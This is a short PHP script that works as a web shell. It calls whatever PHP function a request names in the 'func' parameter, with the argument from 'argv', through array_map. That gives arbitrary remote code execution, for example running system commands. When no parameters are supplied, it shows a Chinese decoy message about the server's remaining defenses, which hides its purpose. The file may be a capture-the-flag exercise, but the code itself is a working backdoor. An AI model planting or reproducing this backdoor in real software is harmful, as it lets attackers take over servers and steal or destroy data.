<?php
if(isset($_GET['func']) || isset($_GET['argv'])){
    $func = $_GET['func'];
    $argv = $_GET['argv'];
    $array[0] = $argv;
    array_map($func, $array);
} else {
    echo "服务器剩余防御：1层";
}
?>